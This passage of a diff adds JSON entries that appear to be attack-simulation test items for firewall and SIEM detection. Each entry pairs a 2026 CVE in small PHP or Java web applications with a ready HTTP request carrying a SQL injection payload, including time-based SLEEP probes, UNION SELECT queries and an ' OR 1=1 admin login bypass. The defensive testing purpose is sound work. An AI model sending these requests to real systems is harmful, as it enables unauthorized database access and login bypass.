+        "link": "https://github.com/6Justdododo6/CVE/issues/16"
+      },
+      {
+        "title": "vuldb for CVE-2026-5018",
+        "link": "https://vuldb.com/vuln/353903"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5017 - code-projects Simple Food Order System SQL Injection",
+    "displayName": "CVE-2026-5017 - code-projects Simple Food Order System SQL Injection",
+    "description": "code-projects Simple Food Order System 1.0 is vulnerable to SQL injection via the Status argument of /all-tickets.php (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in the Status parameter, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description. Method is inferred GET (Status is a listing/filter parameter, same pattern as all-orders.php).\n\nReferences used to recreate this request:\n- https://github.com/6Justdododo6/CVE/issues/15 (PoC, not reachable in this session)\n- https://vuldb.com/vuln/353902 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-5017 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /all-tickets.php?Status=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5017"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5017",
+        "link": "https://github.com/6Justdododo6/CVE/issues/15"
+      },
+      {
+        "title": "vuldb for CVE-2026-5017",
+        "link": "https://vuldb.com/vuln/353902"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4970 - code-projects Social Networking Site SQL Injection",
+    "displayName": "CVE-2026-4970 - code-projects Social Networking Site SQL Injection",
+    "description": "code-projects Social Networking Site 1.0 is vulnerable to SQL injection via the ID argument of delete_photos.php. The request sends a time-based SQL injection payload (AND SLEEP(5)) in the ID parameter, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB/PoC entry-point description. Method is inferred GET (delete-by-id endpoint).\n\nReferences used to recreate this request:\n- https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/SQL%20Injection%20in%20Social%20Networking%20Site%20v1.0%20delete_photos.php.md (PoC, not reachable in this session)\n- https://vuldb.com/?id.353857 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4970 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /delete_photos.php?ID=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4970"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4970",
+        "link": "https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/SQL%20Injection%20in%20Social%20Networking%20Site%20v1.0%20delete_photos.php.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4970",
+        "link": "https://vuldb.com/?id.353857"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4966 - itsourcecode Free Hotel Reservation System SQL Injection",
+    "displayName": "CVE-2026-4966 - itsourcecode Free Hotel Reservation System SQL Injection",
+    "description": "itsourcecode Free Hotel Reservation System 1.0 is vulnerable to SQL injection via the id argument of /admin/mod_room/index.php?view=edit. The request sends a time-based SQL injection payload (AND SLEEP(5)) in id, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (the full path and view=edit action are given by the advisory). Method is inferred GET (view=edit&id= detail page).\n\nReferences used to recreate this request:\n- https://github.com/bybinyu/Vulnerability-Practice/issues/8 (PoC, not reachable in this session)\n- https://vuldb.com/?id.353843 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4966 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/mod_room/index.php?view=edit&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4966"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4966",
+        "link": "https://github.com/bybinyu/Vulnerability-Practice/issues/8"
+      },
+      {
+        "title": "vuldb for CVE-2026-4966",
+        "link": "https://vuldb.com/?id.353843"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4956 - Streamax Crocus SQL Injection",
+    "displayName": "CVE-2026-4956 - Streamax Crocus SQL Injection",
+    "description": "Shenzhen Ruiming Technology Streamax Crocus 1.3.44 is vulnerable to SQL injection via the State argument of /DevicePrint.do?Action=ReadTask (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in State, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (file /DevicePrint.do, action ReadTask, argument State). Method is inferred GET (Java .do endpoint driven by Action/State query parameters).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.353833 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4956 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /DevicePrint.do?Action=ReadTask&State=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4956"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2026-4956",
+        "link": "https://vuldb.com/?id.353833"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4955 - Streamax Crocus SQL Injection",
+    "displayName": "CVE-2026-4955 - Streamax Crocus SQL Injection",
+    "description": "Shenzhen Ruiming Technology Streamax Crocus 1.3.44 is vulnerable to SQL injection via the VehicleID argument of /OperateStatistic.do. The request sends a time-based SQL injection payload (AND SLEEP(5)) in VehicleID, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (file /OperateStatistic.do, argument VehicleID). Method is inferred GET (Java .do statistics endpoint driven by query parameters).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.353143 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4955 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /OperateStatistic.do?VehicleID=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4955"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2026-4955",
+        "link": "https://vuldb.com/?id.353143"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4954 - mingSoft MCMS SQL Injection",
+    "displayName": "CVE-2026-4954 - mingSoft MCMS SQL Injection",
+    "description": "mingSoft MCMS up to 5.5.0 is vulnerable to SQL injection in the list function of the web Content List endpoint (ContentAction.java), exposed at /cms/content/list.do. The request POSTs a time-based SQL injection payload (AND SLEEP(5)) in the categoryId parameter, triggering OWASP CRS 942 SQLi signatures. The endpoint and categoryId parameter are the long-established injectable vector for this exact Content List endpoint (nuclei template for CVE-2022-26585, scan4all PoC, and the current MCMS source that POSTs to /cms/content/list.do); the VulDB description does not name the argument, so categoryId is taken from that established PoC for the same endpoint/function.\n\nReferences used to recreate this request:\n- https://github.com/wing3e/public_exp/issues/4 (PoC, not reachable in this session)\n- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-26585.yaml (nuclei template: /cms/content/list categoryId SQLi)\n- https://vuldb.com/?id.353832 (VulDB entry: file + function)\n- https://www.cve.org/CVERecord?id=CVE-2026-4954 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /cms/content/list.do HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\ncategoryId=1%27%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-4954"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4954",
+        "link": "https://github.com/wing3e/public_exp/issues/4"
+      },
+      {
+        "title": "poc_nuclei for CVE-2026-4954 (same endpoint, CVE-2022-26585)",
+        "link": "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-26585.yaml"
+      },
+      {
+        "title": "vuldb for CVE-2026-4954",
+        "link": "https://vuldb.com/?id.353832"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4910 - Streamax Crocus SQL Injection",
+    "displayName": "CVE-2026-4910 - Streamax Crocus SQL Injection",
+    "description": "Shenzhen Ruiming Technology Streamax Crocus up to 1.3.44 is vulnerable to SQL injection via the State argument of /RemoteFormat.do. The request sends a time-based SQL injection payload (AND SLEEP(5)) in State, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (file /RemoteFormat.do, argument State). Method is inferred GET (Java .do endpoint driven by query parameters).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.353661 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4910 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /RemoteFormat.do?State=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4910"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2026-4910",
+        "link": "https://vuldb.com/?id.353661"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4908 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-4908 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the userid argument of /modstaffinfo.php (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in userid, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description. Method is inferred GET (modify-staff-info page loaded by userid).\n\nReferences used to recreate this request:\n- https://github.com/Niuzzz123/CVE-Niuzzz/issues/2 (PoC, not reachable in this session)\n- https://vuldb.com/?id.353659 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4908 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /modstaffinfo.php?userid=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4908"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4908",
+        "link": "https://github.com/Niuzzz123/CVE-Niuzzz/issues/2"
+      },
+      {
+        "title": "vuldb for CVE-2026-4908",
+        "link": "https://vuldb.com/?id.353659"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4876 - itsourcecode Free Hotel Reservation System SQL Injection",
+    "displayName": "CVE-2026-4876 - itsourcecode Free Hotel Reservation System SQL Injection",
+    "description": "itsourcecode Free Hotel Reservation System 1.0 is vulnerable to SQL injection via the id argument of /admin/mod_amenities/index.php?view=editpic. The request sends a time-based SQL injection payload (AND SLEEP(5)) in id, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (full path and view=editpic action are given by the advisory). Method is inferred GET (view=editpic&id= detail page).\n\nReferences used to recreate this request:\n- https://github.com/bybinyu/Vulnerability-Practice/issues/5 (PoC, not reachable in this session)\n- https://vuldb.com/?id.353559 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-4876 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/mod_amenities/index.php?view=editpic&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4876"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4876",
+        "link": "https://github.com/bybinyu/Vulnerability-Practice/issues/5"
+      },
+      {
+        "title": "vuldb for CVE-2026-4876",
+        "link": "https://vuldb.com/?id.353559"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4850 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-4850 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the Long-arm-shirtVol argument of /checkregisitem.php (Parameter Handler). The request submits a time-based (SLEEP) SQL injection payload in Long-arm-shirtVol, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description (the GitHub issue PoC was unreachable in this environment, so the HTTP method was inferred as a POST form submission).\n\nReferences used to recreate this request:\n- https://github.com/kbloow/CVE/issues/1 (PoC - GitHub issue, unreachable in this environment)\n- https://vuldb.com/?id.353155 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4850 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /checkregisitem.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nLong-arm-shirtVol=1'+AND+SLEEP(5)--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4850"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4850",
+        "link": "https://github.com/kbloow/CVE/issues/1"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4850",
+        "link": "https://vuldb.com/?id.353155"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4844 - code-projects Online Food Ordering System SQL Injection",
+    "displayName": "CVE-2026-4844 - code-projects Online Food Ordering System SQL Injection",
+    "description": "code-projects Online Food Ordering System 1.0 is vulnerable to SQL injection via the Username argument of the Admin Login Module at /admin.php. The request submits an authentication-bypass SQL injection payload (' OR 1=1-- -) in Username, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description and PoC gist (a login form POST; the password field is a dummy value).\n\nReferences used to recreate this request:\n- https://gist.github.com/HxH404/8e5bd42c0f968a92a23edc5e7b879955 (PoC - gist)\n- https://vuldb.com/?id.353149 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4844 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nUsername=admin'+OR+1=1--+-&Password=dummy\n"
+    },
+    "cves": [
+      "CVE-2026-4844"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gist for CVE-2026-4844",
+        "link": "https://gist.github.com/HxH404/8e5bd42c0f968a92a23edc5e7b879955"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4844",
+        "link": "https://vuldb.com/?id.353149"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4842 - itsourcecode Online Enrollment System SQL Injection",
+    "displayName": "CVE-2026-4842 - itsourcecode Online Enrollment System SQL Injection",
+    "description": "itsourcecode Online Enrollment System 1.0 is vulnerable to SQL injection via the deptid argument of /sms/grades/index.php?view=edit&id=1 (Parameter Handler). The request submits a UNION SELECT SQL injection payload in the deptid query parameter, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description (the injectable URL already carries view=edit&id=1; GET method taken from the described query-string parameter).\n\nReferences used to recreate this request:\n- https://github.com/dsdsadawada/CVE1/issues/4 (PoC - GitHub issue, unreachable in this environment)\n- https://vuldb.com/?id.353148 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4842 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /sms/grades/index.php?view=edit&id=1&deptid=-1%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4842"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4842",
+        "link": "https://github.com/dsdsadawada/CVE1/issues/4"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4842",
+        "link": "https://vuldb.com/?id.353148"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4841 - code-projects Online Food Ordering System SQL Injection",
+    "displayName": "CVE-2026-4841 - code-projects Online Food Ordering System SQL Injection",
+    "description": "code-projects Online Food Ordering System 1.0 is vulnerable to SQL injection via the del argument of form/cart.php (Shopping Cart Module). The request submits a UNION SELECT SQL injection payload in the del query parameter (a cart item id), matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description and PoC gist (del is an item-id delete parameter, so GET was inferred).\n\nReferences used to recreate this request:\n- https://gist.github.com/HxH404/ed090db972001ba535202fd4f5b6a0b5 (PoC - gist)\n- https://vuldb.com/?id.353147 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4841 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /form/cart.php?del=-1%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4841"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gist for CVE-2026-4841",
+        "link": "https://gist.github.com/HxH404/ed090db972001ba535202fd4f5b6a0b5"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4841",
+        "link": "https://vuldb.com/?id.353147"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4839 - SourceCodester Food Ordering System SQL Injection",
+    "displayName": "CVE-2026-4839 - SourceCodester Food Ordering System SQL Injection",
+    "description": "SourceCodester Food Ordering System 1.0 is vulnerable to SQL injection via the custom argument of /purchase.php (Parameter Handler). The request submits a UNION SELECT SQL injection payload in custom, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description (GitHub PoC unreachable here; GET method inferred for the parameter-handler endpoint).\n\nReferences used to recreate this request:\n- https://github.com/WHOAMI-xiaoyu/CVE/blob/main/CVE_9.md (PoC - GitHub, unreachable in this environment)\n- https://vuldb.com/?id.353142 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4839 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /purchase.php?custom=-1%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4839"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4839",
+        "link": "https://github.com/WHOAMI-xiaoyu/CVE/blob/main/CVE_9.md"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4839",
+        "link": "https://vuldb.com/?id.353142"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4838 - SourceCodester Malawi Online Market SQL Injection",
+    "displayName": "CVE-2026-4838 - SourceCodester Malawi Online Market SQL Injection",
+    "description": "SourceCodester Malawi Online Market 1.0 is vulnerable to SQL injection via the ID argument of /display.php. The request submits a UNION SELECT SQL injection payload in the ID query parameter, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description (display page keyed by ID, so GET was inferred).\n\nReferences used to recreate this request:\n- https://github.com/WHOAMI-xiaoyu/CVE/blob/main/CVE_8.md (PoC - GitHub, unreachable in this environment)\n- https://vuldb.com/?id.353141 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4838 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /display.php?ID=-1%20UNION%20SELECT%201,2,3,4--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2026-4838"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4838",
+        "link": "https://github.com/WHOAMI-xiaoyu/CVE/blob/main/CVE_8.md"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4838",
+        "link": "https://vuldb.com/?id.353141"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4836 - code-projects Accounting System SQL Injection",
+    "displayName": "CVE-2026-4836 - code-projects Accounting System SQL Injection",
+    "description": "code-projects Accounting System 1.0 is vulnerable to time-based blind SQL injection via the cos_id argument of /my_account/delete.php. The request submits a time-based (SLEEP) SQL injection payload in the cos_id query parameter, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the published PoC (which documents a time-based blind SQLi in cos_id; GET inferred for the delete-by-id endpoint).\n\nReferences used to recreate this request:\n- https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/Time-Based%20Blind%20SQL%20Injection%20Accounting%20System%20in%20PHP%20in%20cos_id%20Parameter.md (PoC - GitHub, unreachable in this environment)\n- https://vuldb.com/?id.353140 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4836 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /my_account/delete.php?cos_id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4836"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4836",
+        "link": "https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/Time-Based%20Blind%20SQL%20Injection%20Accounting%20System%20in%20PHP%20in%20cos_id%20Parameter.md"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4836",
+        "link": "https://vuldb.com/?id.353140"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4826 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4826 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection via the sid argument of /update_stock.php (HTTP GET Parameter Handler). The request submits a UNION SELECT SQL injection payload in the sid query parameter, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description and PoC (the CVE states an HTTP GET parameter).\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateStock-sid.md (PoC - GitHub, unreachable in this environment)\n- https://vuldb.com/?id.353126 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4826 (CVE record)",
+    "type": "webRequest",
+    "value": {
